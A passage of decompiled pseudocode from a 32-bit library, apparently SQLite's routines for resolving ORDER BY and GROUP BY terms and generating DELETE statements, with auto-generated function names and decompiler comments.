LABEL_31:
        sub_10084F84(v18, a1);
        if ( v24 )
          *(_BYTE *)(v2 + 20) = 1;
        return 1;
      }
    }
    else if ( *(_BYTE *)(v2 + 22) )
    {
      sub_10059320(v4, aParametersProh);
    }
LABEL_39:
    result = 0;
    if ( v4[16] || *(_BYTE *)(*v4 + 30) )
      return 2;
    return result;
  }
  if ( v6 != 118 )
  {
    switch ( v6 )
    {
      case 20:
        goto LABEL_9;
      case 26:
        return sub_1007F22A((int)a2, (int)v4, 0, 0, *((unsigned __int8 **)a2 + 1), v2);
      case 72:
      case 116:
LABEL_9:
        if ( (v7 & 0x800) != 0 )
        {
          v23 = *(_DWORD *)(v2 + 12);
          if ( *(_BYTE *)(v2 + 22) )
            sub_10059320(v4, aSubqueriesProh);
          sub_10085024(a1, *((_DWORD *)a2 + 4));
          if ( v23 != *(_DWORD *)(v2 + 12) )
            *((_WORD *)a2 + 1) |= 0x20u;
        }
        break;
    }
    goto LABEL_39;
  }
  v8 = *((_DWORD *)a2 + 3);
  v9 = *((_DWORD *)a2 + 2);
  if ( *(_BYTE *)v8 == 26 )
  {
    v10 = 0;
  }
  else
  {
    v10 = *(unsigned __int8 **)(v9 + 4);
    v9 = *(_DWORD *)(v8 + 8);
    v8 = *(_DWORD *)(v8 + 12);
  }
  return sub_1007F22A((int)a2, (int)v4, v10, *(unsigned __int8 **)(v9 + 4), *(unsigned __int8 **)(v8 + 4), v2);
}
// 1007F858: variable 'v16' is possibly undefined

//----- (1007F93A) --------------------------------------------------------
int __usercall sub_1007F93A@<eax>(int *a1@<eax>, int a2@<ecx>)
{
  unsigned __int8 *v2; // ebx
  int v3; // edi
  unsigned __int8 **i; // esi
  int v6; // [esp+Ch] [ebp-4h]

  v6 = 0;
  v2 = *(unsigned __int8 **)(a2 + 4);
  v3 = *a1;
  if ( *a1 <= 0 )
    return 0;
  for ( i = (unsigned __int8 **)(a1[3] + 4); !*i || sub_100593BE(*i, v2); i += 5 )
  {
    if ( ++v6 >= v3 )
      return 0;
  }
  return v6 + 1;
}

//----- (1007F97D) --------------------------------------------------------
int __usercall sub_1007F97D@<eax>(int a1@<eax>, int *a2, int a3)
{
  int *v4; // ebx
  int v6; // esi
  int v7; // edi
  int *i; // ebx
  int v9[9]; // [esp+Ch] [ebp-24h] BYREF

  v4 = *(int **)a1;
  memset(v9, 0, sizeof(v9));
  v9[4] = 0;
  v9[0] = (int)a2;
  v9[1] = *(_DWORD *)(a1 + 8);
  v9[2] = (int)v4;
  LOBYTE(v9[5]) = 1;
  if ( sub_1008003C(a3, (int)v9) )
  {
    sub_1005934E(a2);
    return 0;
  }
  v6 = *v4;
  v7 = 0;
  if ( *v4 <= 0 )
    return 0;
  for ( i = (int *)v4[3]; !sub_10078638(*i, a3); i += 5 )
  {
    if ( ++v7 >= v6 )
      return 0;
  }
  return v7 + 1;
}

//----- (1007F9F9) --------------------------------------------------------
int __usercall sub_1007F9F9@<eax>(int *a1@<edi>, int a2, int a3, int a4)
{
  return sub_10059320(a1, aRSByTermOutOfR, a3, a2, a4);
}

//----- (1007FA16) --------------------------------------------------------
int __cdecl sub_1007FA16(int *a1, int **a2)
{
  int **v2; // esi
  int *v3; // edi
  int v5; // ecx
  int v6; // eax
  int i; // eax
  int v8; // ebx
  int v9; // eax
  _DWORD *v10; // eax
  __int16 v11; // si
  _DWORD *v12; // eax
  int v13; // ecx
  int v14; // eax
  _BYTE *k; // edi
  unsigned int v16; // [esp+Ch] [ebp-1Ch]
  void *v17; // [esp+Ch] [ebp-1Ch]
  int *v18; // [esp+10h] [ebp-18h]
  int v19; // [esp+14h] [ebp-14h]
  int j; // [esp+18h] [ebp-10h]
  void **Src; // [esp+1Ch] [ebp-Ch]
  int v22; // [esp+20h] [ebp-8h]
  int v23; // [esp+24h] [ebp-4h] BYREF

  v2 = a2;
  v3 = a2[6];
  v19 = 1;
  if ( !v3 )
    return 0;
  v22 = *a1;
  if ( *v3 > *(_DWORD *)(*a1 + 80) )
  {
    sub_10059320(a1, aTooManyTermsIn_0);
    return 1;
  }
  v5 = 0;
  if ( *v3 > 0 )
  {
    v6 = 0;
    do
    {
      *(_BYTE *)(v3[3] + v6 + 13) = 0;
      ++v5;
      v6 += 20;
    }
    while ( v5 < *v3 );
  }
  a2[8] = 0;
  for ( i = (int)(a2 + 7); *(_DWORD *)i; i = *(_DWORD *)i + 28 )
  {
    *(_DWORD *)(*(_DWORD *)i + 32) = v2;
    a2 = *(int ***)i;
    v2 = *(int ***)i;
  }
  while ( v19 )
  {
    v8 = v3[3];
    v19 = 0;
    v18 = *v2;
    for ( j = 0; j < *v3; v8 += 20 )
    {
      v23 = -1;
      if ( !*(_BYTE *)(v8 + 13) )
      {
        Src = *(void ***)v8;
        if ( sub_1007687B(*(_DWORD *)v8, &v23) )
        {
          if ( v23 <= 0 || v23 > *v18 )
          {
            sub_1007F9F9(a1, (int)aOrder_1, j + 1, *v18);
            return 1;
          }
        }
        else
        {
          if ( *(_BYTE *)Src == 26 )
            v9 = sub_1007F93A(v18, (int)Src);
          else
            v9 = 0;
          v23 = v9;
          if ( !v9 )
          {
            v10 = sub_1007631C(v22, Src, 0);
            v16 = (unsigned int)v10;
            if ( !*(_BYTE *)(v22 + 30) )
              v23 = sub_1007F97D((int)v2, a1, (int)v10);
            sub_10075FD8(v22, v16);
          }
        }
        if ( v23 <= 0 )
        {
          v19 = 1;
        }
        else
        {
          v17 = Src[5];
          v11 = *((_WORD *)Src + 1) & 0x100;
          sub_10075FD8(v22, (unsigned int)Src);
          v12 = sub_10075D3B(v22, 129);
          *(_DWORD *)v8 = v12;
          if ( !v12 )
            return 1;
          v12[5] = v17;
          *((_WORD *)v12 + 1) |= v11 | 0x400;
          v2 = a2;
          v12[1] = v23;
          *(_WORD *)(v8 + 14) = v23;
          *(_BYTE *)(v8 + 13) = 1;
        }
      }
      ++j;
    }
    a2 = (int **)v2[8];
    if ( !a2 )
      break;
    v2 = (int **)v2[8];
  }
  v13 = *v3;
  v14 = 0;
  if ( *v3 <= 0 )
    return 0;
  for ( k = (_BYTE *)(v3[3] + 13); ; k += 20 )
  {
    ++v14;
    if ( !*k )
      break;
    if ( v14 >= v13 )
      return 0;
  }
  sub_10059320(a1, aROrderByTermDo, v14);
  return 1;
}

//----- (1007FC16) --------------------------------------------------------
int __usercall sub_1007FC16@<eax>(int *a1@<eax>, int *a2, int **a3, char *a4)
{
  int *v6; // ebx
  int v7; // esi
  unsigned __int16 v8; // ax
  int v9; // [esp+10h] [ebp-4h]

  if ( !a1 || *(_BYTE *)(*a2 + 30) )
    return 0;
  if ( *a1 > *(_DWORD *)(*a2 + 80) )
  {
    sub_10059320(a2, "too many terms in %s BY clause", a4);
    return 1;
  }
  v9 = 0;
  v6 = *a3;
  v7 = a1[3];
  if ( *a1 <= 0 )
    return 0;
  while ( 1 )
  {
    v8 = *(_WORD *)(v7 + 14);
    if ( v8 )
      break;
LABEL_10:
    ++v9;
    v7 += 20;
    if ( v9 >= *a1 )
      return 0;
  }
  if ( v8 <= *v6 )
  {
    sub_1007F120(v8 - 1, a4, a2, (int)v6, *(_DWORD **)v7);
    goto LABEL_10;
  }
  sub_1007F9F9(a2, (int)a4, v9 + 1, *v6);
  return 1;
}

//----- (1007FCA9) --------------------------------------------------------
int __cdecl sub_1007FCA9(int **a1, int **a2, int *a3, char *a4)
{
  int *v4; // edi
  int **v6; // esi
  int v7; // eax
  int v8; // ebx
  _BYTE *v9; // ecx
  int v10; // eax
  int v11; // [esp+Ch] [ebp-14h]
  int *v12; // [esp+10h] [ebp-10h]
  int v13; // [esp+14h] [ebp-Ch]
  int v14; // [esp+18h] [ebp-8h] BYREF
  int v15; // [esp+1Ch] [ebp-4h]

  v4 = a3;
  if ( !a3 )
    return 0;
  v6 = a2;
  v7 = **a2;
  v15 = 0;
  v8 = a3[3];
  v11 = v7;
  v12 = *a1;
  if ( *a3 <= 0 )
    return sub_1007FC16(v4, v12, v6, a4);
  while ( 1 )
  {
    v9 = *(_BYTE **)v8;
    v13 = *(_DWORD *)v8;
    if ( **(_BYTE **)v8 == 26 )
    {
      v10 = sub_1007F93A(*v6, (int)v9);
      v9 = (_BYTE *)v13;
    }
    else
    {
      v10 = 0;
    }
    v14 = v10;
    if ( v10 > 0 )
      goto LABEL_8;
    if ( sub_1007687B((int)v9, &v14) )
      break;
    *(_WORD *)(v8 + 14) = 0;
    if ( sub_1008003C(v13, (int)a1) )
      return 1;
    v4 = a3;
    v6 = a2;
LABEL_15:
    ++v15;
    v8 += 20;
    if ( v15 >= *v4 )
      return sub_1007FC16(v4, v12, v6, a4);
  }
  LOWORD(v10) = v14;
  if ( v14 >= 1 )
  {
LABEL_8:
    *(_WORD *)(v8 + 14) = v10;
    goto LABEL_15;
  }
  sub_1007F9F9(v12, (int)a4, v15 + 1, v11);
  return 1;
}

//----- (1007FD73) --------------------------------------------------------
int __cdecl sub_1007FD73(int a1, int a2)
{
  int v2; // ebx
  __int16 v3; // dx
  int *v4; // esi
  int v5; // edi
  int *v7; // eax
  int v8; // eax
  int v9; // ecx
  int v10; // edi
  bool v11; // zf
  int *v12; // eax
  int v13; // eax
  int v14; // ecx
  int v15; // [esp-4h] [ebp-64h]
  int v16; // [esp+Ch] [ebp-54h]
  int v17; // [esp+Ch] [ebp-54h]
  int *v18; // [esp+10h] [ebp-50h]
  int v19; // [esp+14h] [ebp-4Ch]
  int v20; // [esp+14h] [ebp-4Ch]
  int *v21; // [esp+18h] [ebp-48h]
  int *v22; // [esp+18h] [ebp-48h]
  int *v23; // [esp+1Ch] [ebp-44h]
  int v24; // [esp+20h] [ebp-40h]
  BOOL v25; // [esp+24h] [ebp-3Ch]
  int v26[4]; // [esp+2Ch] [ebp-34h] BYREF
  int *v27[9]; // [esp+3Ch] [ebp-24h] BYREF

  v2 = a2;
  v3 = *(_WORD *)(a2 + 6);
  if ( (v3 & 2) == 0 )
  {
    v4 = *(int **)(a1 + 8);
    v5 = *v4;
    v23 = *(int **)(a1 + 12);
    v18 = v4;
    v24 = *v4;
    if ( (v3 & 0x10) != 0 )
    {
      v25 = *(_DWORD *)(a2 + 28) != 0;
      while ( 1 )
      {
        *(_WORD *)(v2 + 6) |= 2u;
        memset(v27, 0, sizeof(v27));
        v27[0] = v4;
        if ( sub_1008003C(*(_DWORD *)(v2 + 40), (int)v27) || sub_1008003C(*(_DWORD *)(v2 + 44), (int)v27) )
          return 2;
        LOBYTE(v27[5]) = 1;
        v27[1] = *(int **)(v2 + 8);
        v27[8] = v23;
        v7 = *(int **)v2;
        v21 = *(int **)v2;
        v16 = 0;
        if ( **(int **)v2 > 0 )
        {
          v19 = 0;
          while ( !sub_1008003C(*(_DWORD *)(v19 + v7[3]), (int)v27) )
          {
            ++v16;
            v19 += 20;
            if ( v16 >= *v21 )
              goto LABEL_15;
            v7 = v21;
          }
          return 2;
        }
LABEL_15:
        v17 = 0;
        if ( **(__int16 **)(v2 + 8) > 0 )
        {
          v20 = 0;
          do
          {
            v8 = *(_DWORD *)(v2 + 8) + v20 + 8;
            if ( *(_DWORD *)(*(_DWORD *)(v2 + 8) + v20 + 24) )
            {
              v9 = *(_DWORD *)(*(_DWORD *)(v2 + 8) + v20 + 12);
              v10 = v18[127];
              if ( v9 )
                v18[127] = v9;
              v15 = *(_DWORD *)(v8 + 16);
              v26[0] = (int)sub_1007F728;
              v26[1] = (int)sub_1007FD73;
              v26[2] = (int)v18;
              v26[3] = (int)v23;
              sub_10085024((int)v26, v15);
              v11 = v18[16] == 0;
              v18[127] = v10;
              if ( !v11 || *(_BYTE *)(v24 + 30) )
                return 2;
            }
            ++v17;
            v20 += 56;
          }
          while ( v17 < **(__int16 **)(v2 + 8) );
        }
        v12 = *(int **)(v2 + 16);
        v22 = v12;
        if ( v12 || BYTE1(v27[5]) )
          *(_WORD *)(v2 + 6) |= 4u;
        else
          LOBYTE(v27[5]) = 0;
        if ( *(_DWORD *)(v2 + 20) && !v12 )
        {
          sub_10059320(v18, aAGroupByClause);
          return 2;
        }
        v27[2] = *(int **)v2;
        if ( sub_1008003C(*(_DWORD *)(v2 + 12), (int)v27) )
          return 2;
        if ( sub_1008003C(*(_DWORD *)(v2 + 20), (int)v27) )
          return 2;
        v27[8] = 0;
        LOBYTE(v27[5]) = 1;
        if ( !v25 )
        {
          if ( sub_1007FCA9(v27, (int **)v2, *(int **)(v2 + 24), aOrder_2) )
            return 2;
        }
        if ( *(_BYTE *)(v24 + 30) )
          return 2;
        if ( v22 )
        {
          if ( sub_1007FCA9(v27, (int **)v2, v22, aGroup) || *(_BYTE *)(v24 + 30) )
            return 2;
          v13 = v22[3];
          v14 = 0;
          if ( *v22 > 0 )
          {
            while ( (*(_BYTE *)(*(_DWORD *)v13 + 2) & 2) == 0 )
            {
              ++v14;
              v13 += 20;
              if ( v14 >= *v22 )
                goto LABEL_40;
            }
            sub_10059320(v18, aAggregateFunct);
            return 2;
          }
        }
LABEL_40:
        v2 = *(_DWORD *)(v2 + 28);
        if ( !v2 )
        {
          if ( v25 && sub_1007FA16(v18, (int **)a2) )
            return 2;
          return 1;
        }
        v4 = v18;
      }
    }
    sub_1007E178(v4, a2, *(_DWORD *)(a1 + 12));
    if ( v4[16] || *(_BYTE *)(v5 + 30) )
      return 2;
  }
  return 1;
}
// 1007E178: using guessed type _DWORD __cdecl sub_1007E178(_DWORD, _DWORD, _DWORD);
// 1007FD73: using guessed type int __cdecl sub_1007FD73(int, int);

//----- (1008003C) --------------------------------------------------------
BOOL __usercall sub_1008003C@<eax>(int a1@<edi>, int a2@<esi>)
{
  int *v3; // ebx
  int v4; // ebx
  int (__cdecl *v5[2])(_DWORD, int); // [esp+8h] [ebp-10h] BYREF
  int *v6; // [esp+10h] [ebp-8h]
  int v7; // [esp+14h] [ebp-4h]

  if ( !a1 )
    return 0;
  v3 = *(int **)a2;
  if ( sub_10075B4A(*(int **)a2, *(_DWORD *)(a1 + 44) + *(_DWORD *)(*(_DWORD *)a2 + 532)) )
    return 1;
  v3[133] += *(_DWORD *)(a1 + 44);
  v4 = *(unsigned __int8 *)(a2 + 21);
  v6 = *(int **)a2;
  *(_BYTE *)(a2 + 21) = 0;
  v5[0] = (int (__cdecl *)(_DWORD, int))sub_1007F728;
  v5[1] = sub_1007FD73;
  v7 = a2;
  sub_10084F0D(v5, a1);
  *(_DWORD *)(*(_DWORD *)a2 + 532) -= *(_DWORD *)(a1 + 44);
  if ( *(int *)(a2 + 16) > 0 || v6[16] > 0 )
    *(_WORD *)(a1 + 2) |= 8u;
  if ( *(_BYTE *)(a2 + 21) )
  {
    *(_WORD *)(a1 + 2) |= 2u;
  }
  else if ( v4 )
  {
    *(_BYTE *)(a2 + 21) = 1;
  }
  return (*(_BYTE *)(a1 + 2) & 8) == 8;
}
// 1007FD73: using guessed type int __cdecl sub_1007FD73(int, int);

//----- (100800E1) --------------------------------------------------------
int __usercall sub_100800E1@<eax>(int a1@<eax>, int a2, int a3)
{
  int v4[4]; // [esp+0h] [ebp-10h] BYREF

  v4[2] = a1;
  v4[3] = a3;
  v4[0] = (int)sub_1007F728;
  v4[1] = (int)sub_1007FD73;
  return sub_10085024((int)v4, a2);
}
// 1007FD73: using guessed type int __cdecl sub_1007FD73(int, int);

//----- (1008010E) --------------------------------------------------------
int *__usercall sub_1008010E@<eax>(int a1@<eax>, int *a2)
{
  _DWORD *v2; // esi
  int *v3; // edi

  v2 = (_DWORD *)(a1 + 8);
  v3 = sub_10069EB7((int)a2, 0, *(unsigned __int8 **)(a1 + 12), *(unsigned __int8 **)(a1 + 8));
  sub_1006A1BB(v2[3]);
  v2[3] = v3;
  if ( v3 )
    ++*((_WORD *)v3 + 16);
  if ( sub_1007DBAF(v2, a2) )
    return 0;
  return v3;
}

//----- (10080158) --------------------------------------------------------
int __usercall sub_10080158@<eax>(int a1@<eax>, int a2@<edx>, int a3)
{
  char v3; // bl

  v3 = *(_BYTE *)(a2 + 34);
  if ( (v3 & 0x10) != 0 && !*(_DWORD *)(*(_DWORD *)sub_10070E9E(a2, *(_DWORD *)a1)[1] + 52)
    || (v3 & 1) != 0 && (*(_DWORD *)(*(_DWORD *)a1 + 12) & 0x10000) == 0 && !*(_BYTE *)(a1 + 19) )
  {
    sub_10059320((int *)a1, aTableSMayNotBe_2);
    return 1;
  }
  if ( !a3 && *(_DWORD *)(a2 + 28) )
  {
    sub_10059320((int *)a1, aCannotModifySB);
    return 1;
  }
  return 0;
}
// 100801AD: variable 'a2' is possibly undefined

//----- (100801C4) --------------------------------------------------------
void __cdecl sub_100801C4(int *a1, int a2, void **Src, int a4)
{
  int v4; // edi
  __int16 *v5; // esi
  char v6[4]; // [esp+Ch] [ebp-14h] BYREF
  int v7; // [esp+10h] [ebp-10h]
  int v8; // [esp+14h] [ebp-Ch]
  int v9; // [esp+18h] [ebp-8h]
  _DWORD **v10; // [esp+1Ch] [ebp-4h]
  _DWORD *Srca; // [esp+30h] [ebp+10h]

  v4 = *a1;
  v10 = (_DWORD **)sub_100765C5(*a1, *(_DWORD *)(a2 + 28), 0);
  if ( Src )
  {
    Srca = sub_1007631C(v4, Src, 0);
    v5 = sub_1006C71D(0, v4, 0, 0);
    if ( v5 )
    {
      *((_DWORD *)v5 + 4) = sub_10059194(*(_BYTE **)(a2 + 4));
      *((_DWORD *)v5 + 6) = v10;
    }
    else
    {
      sub_1007B016(v4, (unsigned int)v10);
    }
    v10 = (_DWORD **)sub_1007AF57(0, a1, (int)v5, (int)Srca, 0, 0, 0, 0, 0, 0);
  }
  v7 = a4;
  strcpy(v6, "\t");
  v8 = 0;
  v9 = 0;
  sub_1007E480((int)a1, v10, (unsigned __int8 *)v6);
  sub_1007B016(v4, (unsigned int)v10);
}

//----- (1008027F) --------------------------------------------------------
void __cdecl sub_1008027F(int a1, int a2, void **Src)
{
  int v3; // ebx
  int *v4; // eax
  int *v5; // edi
  int v6; // eax
  int v7; // esi
  int v8; // eax
  int v9; // edi
  int *v10; // eax
  int v11; // edi
  int i; // edi
  int v14; // esi
  int v15; // eax
  int v16; // edi
  int v17; // esi
  int *v18; // [esp+Ch] [ebp-4Ch]
  int v19; // [esp+10h] [ebp-48h]
  int v20; // [esp+14h] [ebp-44h]
  int v21; // [esp+18h] [ebp-40h]
  int v22; // [esp+1Ch] [ebp-3Ch]
  _DWORD *v23; // [esp+1Ch] [ebp-3Ch]
  int v24; // [esp+1Ch] [ebp-3Ch]
  int v25; // [esp+20h] [ebp-38h]
  int v26; // [esp+20h] [ebp-38h]
  int v27; // [esp+20h] [ebp-38h]
  int v28; // [esp+24h] [ebp-34h]
  unsigned __int16 *v29; // [esp+24h] [ebp-34h]
  BOOL v30; // [esp+28h] [ebp-30h]
  char v31[8]; // [esp+2Ch] [ebp-2Ch] BYREF
  int v32[9]; // [esp+34h] [ebp-24h] BYREF

  v21 = -1;
  memset(v31, 0, sizeof(v31));
  v3 = a1;
  v19 = *(_DWORD *)a1;
  if ( !*(_DWORD *)(a1 + 64) && !*(_BYTE *)(*(_DWORD *)a1 + 30) )
  {
    v4 = sub_1008010E(a2, (int *)a1);
    v5 = v4;
    v25 = (int)v4;
    if ( v4 )
    {
      v28 = sub_100730F2((_BYTE *)a1, (int)v4, 106, 0, 0);
      v30 = v5[7] != 0;
      if ( !sub_1006B423((int *)a1, (int)v5) && !sub_10080158(a1, (int)v5, v28 != 0) )
      {
        v6 = sub_1005855F(v19, v5[17]);
        v7 = *(_DWORD *)(a1 + 68);
        v22 = v6;
        *(_DWORD *)(a2 + 32) = v7;
        v8 = ++*(_DWORD *)(a1 + 68);
        v9 = v5[5];
        v20 = v7;
        while ( v9 )
        {
          *(_DWORD *)(a1 + 68) = ++v8;
          v9 = *(_DWORD *)(v9 + 32);
        }
        v10 = sub_1007C271((int *)a1);
        v18 = v10;
        if ( v10 )
        {
          if ( !*(_BYTE *)(a1 + 19) )
            *((_BYTE *)v10 + 97) = 1;
          sub_1006CB39((int *)a1, v22, 1);
          if ( v30 )
            sub_100801C4((int *)a1, v25, Src, v7);
          memset(v32, 0, sizeof(v32));
          v32[0] = a1;
          v32[1] = a2;
          if ( !sub_1008003C((int)Src, (int)v32) )
          {
            if ( (*(_WORD *)(v19 + 12) & 0x1000) != 0 )
            {
              v21 = ++*(_DWORD *)(a1 + 72);
              sub_1005ABE8((int)v18, 7, 0, v21);
            }
            if ( Src || v28 )
            {
              v11 = v25;
            }
            else
            {
              v11 = v25;
              if ( (*(_BYTE *)(v25 + 34) & 0x10) == 0
                && !((*(_DWORD *)(*(_DWORD *)a1 + 12) & 0x4000000) != 0 ? sub_1008146C((_DWORD *)v25, 0, 0) : 0) )
              {
                sub_1005AC02(
                  v18,
                  95,
                  *(_DWORD *)(v25 + 24),
                  v22,
                  v21,
                  *(unsigned __int16 **)(v25 + 4),
                  (_BYTE *)0xFFFFFFFE);
                for ( i = *(_DWORD *)(v25 + 20); i; i = *(_DWORD *)(i + 32) )
                  sub_1005ABE8((int)v18, 95, *(_DWORD *)(i + 20), v22);
LABEL_43:
                if ( !*(_BYTE *)(v3 + 19) && !*(_DWORD *)(v3 + 428) )
                  sub_1007952A((int *)v3);
                if ( (*(_WORD *)(v19 + 12) & 0x1000) != 0 && !*(_BYTE *)(v3 + 19) && !*(_DWORD *)(v3 + 428) )
                {
                  sub_1005ABE8((int)v18, 16, v21, 1);
                  sub_1005B4BC(1, (int)v18);
                  sub_1005B518((int)v18, 0, 0, aRowsDeleted, 0);
                }
                goto LABEL_50;
              }
            }
            v14 = *(_DWORD *)(a1 + 72) + 2;
            v26 = *(_DWORD *)(a1 + 72) + 1;
            *(_DWORD *)(a1 + 72) = v14;
            sub_1005ABE8((int)v18, 10, 0, v26);
            v23 = sub_10087D63((int *)a1, (__int16 *)a2, (unsigned __int8 *)Src, 0, 8);
            if ( !v23 )
              goto LABEL_50;
            v15 = sub_100772FA((_DWORD *)a1, v11, -1, v20, v14);
            sub_1005ABE8((int)v18, 104, v26, v15);
            if ( (*(_WORD *)(v19 + 12) & 0x1000) != 0 )
              sub_1005ABE8((int)v18, 20, v21, 1);
            sub_100883D6((unsigned int)v23);
            v24 = sub_1005AC63((int)v18);
            if ( !v30 )
            {
              sub_1007A92E((int *)a1, v11, v20, 39);
              v3 = a1;
            }
            v27 = sub_1005AB66((int)v18, 105, v26, v24, v14);
            if ( (*(_BYTE *)(v11 + 34) & 0x10) != 0 )
            {
              v29 = (unsigned __int16 *)sub_10070E9E(v11, v19);
              sub_10071860((int *)v3, v11);
              sub_1005AC02(v18, 129, 0, 1, v14, v29, (_BYTE *)0xFFFFFFF6);
              sub_1006CB6D((_DWORD *)v3);
            }
            else
            {
              sub_10080683((int *)v3, (_DWORD *)v11, v20, v14, *(_BYTE *)(v3 + 19) == 0, v28, 99);
            }
            sub_1005ABE8((int)v18, 1, 0, v27);
            sub_1005ACAF((int)v18, v24);
            if ( !v30 && (*(_BYTE *)(v11 + 34) & 0x10) == 0 )
            {
              v16 = *(_DWORD *)(v11 + 20);
              if ( v16 )
              {
                v17 = v20 + 1;
                do
                {
                  sub_1005ABE8((int)v18, 42, v17, *(_DWORD *)(v16 + 20));
                  v16 = *(_DWORD *)(v16 + 32);
                  ++v17;
                }
                while ( v16 );
              }
              sub_1005ABD1((int)v18, 42, v20);
            }
            goto LABEL_43;
          }
        }
      }
    }
  }
LABEL_50:
  sub_1006C7F7((__int16 *)a2, v19);
  sub_10075FD8(v19, (unsigned int)Src);
}

//----- (10080683) --------------------------------------------------------
_DWORD *__cdecl sub_10080683(int *a1, _DWORD *a2, int a3, int a4, int a5, int a6, int a7)
{
  int v7; // edi
  int v8; // ecx
  int v9; // edi
  int v10; // eax
  int v11; // ecx
  int v12; // eax
  int v13; // ebx
  int v14; // ecx
  int v15; // ebx
  int *v17; // [esp+Ch] [ebp-14h]
  int v18; // [esp+10h] [ebp-10h]
  int v19; // [esp+10h] [ebp-10h]
  int v20; // [esp+14h] [ebp-Ch]
  int v21; // [esp+18h] [ebp-8h]
  int v22; // [esp+1Ch] [ebp-4h]

  v7 = a1[3];
  v17 = (int *)v7;
  v20 = 0;
  v21 = sub_1005AC63(v7);
  sub_1005AB66(v7, 51, a3, v21, a4);
  v9 = (int)a2;
  if ( (*(_DWORD *)(*a1 + 12) & 0x4000000) != 0 )
    v10 = sub_1008146C(a2, 0, 0);
  else
    v10 = 0;
  if ( v10 || a6 )
  {
    v18 = sub_10073612(a6, (int)a1, 0, 0, 3u, (int)a2, a7);
    v19 = sub_100813BF(v11, a2, a1) | v18;
    v12 = a1[18];
    v13 = v12 + 1;
    a1[18] = v12 + a2[3] + 1;
    v20 = v12 + 1;
    sub_1005ABE8((int)v17, 14, a4, v12 + 1);
    v14 = 0;
    v22 = 0;
    if ( (int)a2[3] > 0 )
    {
      do
      {
        if ( v19 == -1 || ((1 << v14) & v19) != 0 )
        {
          v15 = v14 + v13 + 1;
          sub_1005AB66((int)v17, 28, a3, v14, v15);
          sub_10084195(v22, v17, v9, v15);
          v9 = (int)a2;
          v13 = v20;
          v14 = v22;
        }
        v22 = ++v14;
      }
      while ( v14 < *(_DWORD *)(v9 + 12) );
    }
    sub_100735BF(a1, a6, 106, 0, 1, v9, v13, a7, v21);
    sub_1005AB66((int)v17, 51, a3, v21, a4);
    sub_10081142(a1, (_DWORD *)v9, v13, 0);
  }
  if ( !*(_DWORD *)(v9 + 28) )
  {
    sub_10080855(v9, a1, a3, 0);
    sub_1005ABE8((int)v17, 56, a3, a5 != 0);
    if ( a5 )
      sub_1005AFA8(-1, v17, *(unsigned __int16 **)(v9 + 4), (_BYTE *)0xFFFFFFFE);
  }
  sub_100819B5(v8, a1, (_DWORD *)v9, 0, v20);
  sub_100735BF(a1, a6, 106, 0, 2, (int)a2, v20, a7, v21);
  return sub_1005ACAF((int)v17, v21);
}
// 100806FF: variable 'v11' is possibly undefined
// 10080819: variable 'v8' is possibly undefined

//----- (10080855) --------------------------------------------------------
int __usercall sub_10080855@<eax>(int result@<eax>, _DWORD *a2@<ebx>, int a3, _DWORD *a4)
{
  _DWORD *v4; // esi
  int v5; // edi
  int v6; // eax
  _DWORD *v7; // [esp+Ch] [ebp-4h]

  v4 = *(_DWORD **)(result + 20);
  if ( v4 )
  {
    v5 = a3 + 1;
    v7 = a4;
    do
    {
      if ( !a4 || (result = (int)v7, *v7) )
      {
        v6 = sub_100808B0(a2, v4, a3, 0, 0);
        result = sub_1005AB66(a2[3], 70, v5, v6, v4[1] + 1);
      }
      ++v7;
      v4 = (_DWORD *)v4[8];
      ++v5;
    }
    while ( v4 );
  }
  return result;
}

//----- (100808B0) --------------------------------------------------------
int __cdecl sub_100808B0(_DWORD *a1, _DWORD *a2, int a3, int a4, int a5)
{
  int *v5; // ebx
  int v6; // edi
  int v7; // eax
  int v8; // esi
  int v9; // eax
  unsigned __int16 *v10; // eax
  int v12; // [esp+10h] [ebp-1Ch]
  int v13; // [esp+14h] [ebp-18h]
  int v14; // [esp+18h] [ebp-14h]
  int v15; // [esp+1Ch] [ebp-10h]
  int v16; // [esp+20h] [ebp-Ch]
  int v17; // [esp+24h] [ebp-8h]
  int v18; // [esp+28h] [ebp-4h]

  v5 = (int *)a1[3];
  v6 = a2[1];
  v15 = a2[4];
  v12 = v6;
  v14 = v6 + 1;
  v7 = sub_10078AA4(a1, v6 + 1);
  v8 = v7 + v6;
  v16 = v7;
  sub_1005ABE8((int)v5, 60, a3, v7 + v6);
  v17 = 0;
  if ( v6 > 0 )
  {
    v18 = v16;
    do
    {
      v9 = *(_DWORD *)(a2[2] + 4 * v17);
      v13 = v9;
      if ( v9 == *(_DWORD *)(v15 + 8) )
      {
        sub_1005ABE8((int)v5, 15, v8, v18);
      }
      else
      {
        sub_1005AB66((int)v5, 28, a3, v9, v18);
        sub_10084195(v13, v5, v15, -1);
        v6 = v12;
      }
      ++v17;
      ++v18;
    }
    while ( v17 < v6 );
  }
  if ( a5 )
  {
    sub_1005AB66((int)v5, 30, v16, v14, a4);
    v10 = (unsigned __int16 *)sub_10079249(v5, a2);
    sub_1005AFA8(-1, v5, v10, 0);
  }
  sub_10078AC8((int)a1, v16, v14);
  return v16;
}

//----- (1008099D) --------------------------------------------------------
int __usercall sub_1008099D@<eax>(_DWORD *a1@<eax>, int a2, _DWORD *a3, int a4, _DWORD *a5)
{
  int v6; // ebx
  unsigned __int8 *v7; // edx
  int v8; // eax
  _DWORD *v9; // eax
  int i; // edi
  int v12; // eax
  _DWORD *v13; // ecx
  int v14; // esi
  unsigned __int8 *v15; // edx
  int v16; // esi
  unsigned __int8 *v17; // [esp+Ch] [ebp-14h]
  unsigned __int8 *v18; // [esp+10h] [ebp-10h]
  unsigned __int8 **v19; // [esp+14h] [ebp-Ch]
  unsigned int v20; // [esp+18h] [ebp-8h]
  int j; // [esp+1Ch] [ebp-4h]

  v20 = 0;
  v6 = *(_DWORD *)(a4 + 20);
  v7 = *(unsigned __int8 **)(a4 + 40);
  v18 = v7;
  if ( v6 != 1 )
  {
    if ( a1 )
    {
      v9 = sub_10059073(*(_DWORD *)a2, 4 * v6);
      v20 = (unsigned int)v9;
      if ( !v9 )
        return 1;
      *a1 = v9;
    }
LABEL_10:
    for ( i = a3[5]; i; i = *(_DWORD *)(i + 32) )
    {
      if ( *(_DWORD *)(i + 4) == v6 && *(_BYTE *)(i + 24) )
      {
        if ( v18 )
        {
          for ( j = 0; j < v6; ++j )
          {
            v14 = 24 * *(_DWORD *)(*(_DWORD *)(i + 8) + 4 * j) + a3[4];
            v15 = *(unsigned __int8 **)(v14 + 16);
            if ( !v15 )
              v15 = (unsigned __int8 *)aBinary_4;
